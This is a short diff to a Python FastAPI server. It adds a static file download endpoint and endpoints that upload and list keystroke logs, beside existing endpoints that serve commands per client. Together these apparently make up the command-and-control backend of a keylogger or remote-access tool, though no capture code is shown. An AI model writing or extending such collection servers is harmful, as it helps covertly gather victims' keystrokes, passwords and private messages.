@@ -2,9 +2,11 @@ from fastapi import FastAPI, Depends, HTTPException
 from sqlalchemy.orm import Session
 import database, schemas, repository, models
 from typing import List
-
+from fastapi.responses import FileResponse
+from fastapi.staticfiles import StaticFiles
 app = FastAPI()
 
+app.mount("/static", StaticFiles(directory="static"), name="static")
 
 def get_db():
     db = database.SessionLocal()
@@ -51,3 +53,21 @@ def read_commands(skip: int = 0, limit: int = 100, db: Session = Depends(get_db)
 def read_commands_for_client(client_id: int, skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
     return repository.get_commands_by_client_id(db, client_id, skip=skip, limit=limit)
 
+@app.get("/get-text-file/")
+async def get_text_file():
+    file_path = "static/prueba.txt"
+    return FileResponse(
+        path=file_path, 
+        media_type='application/octet-stream', 
+        headers={"Content-Disposition": f"attachment; filename={file_path.split('/')[-1]}"}
+    )
+
+@app.put("/keystroke-logs/", response_model=schemas.KeystrokeLog)
+def upsert_keystroke_log(keystroke_log: schemas.KeystrokeLogCreate, db: Session = Depends(get_db)):
+    return repository.upsert_keystroke_log(db, keystroke_log)
+
+
+@app.get("/keystroke-logs/", response_model=List[schemas.KeystrokeLog])
+def read_keystroke_logs(skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
+    keystroke_logs = repository.get_keystroke_logs(db, skip=skip, limit=limit)
+    return keystroke_logs
